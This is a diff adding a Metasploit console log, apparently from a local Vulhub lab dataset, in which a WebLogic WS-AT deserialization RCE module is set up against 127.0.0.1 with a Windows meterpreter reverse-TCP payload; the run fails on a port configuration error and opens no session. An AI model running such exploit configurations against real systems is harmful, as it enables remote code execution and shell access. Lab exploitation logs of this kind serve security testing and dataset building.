@@ -1,0 +1,33 @@
+[*] Processing /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc for ERB directives.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/scan.stdout
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/scan.stdout...
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
+[*] No payload configured, defaulting to cmd/windows/ftp/x64/meterpreter/reverse_tcp
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> set RPORT 18024
+RPORT => 18024
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> set TARGETURI /
+TARGETURI => /
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> set SSL false
+SSL => false
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> set VERBOSE true
+VERBOSE => true
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> check
+[-] This module does not support check.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> run -j
+[-] Exploit failed: bad-config: Windows ftp.exe only connects to port 21. Set FETCH_SRVPORT=21.
+[*] Exploit completed, but no session was created.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> sleep 25
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> spool off
+[*] Spooling is now disabled
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_10271/run.rc)> exit
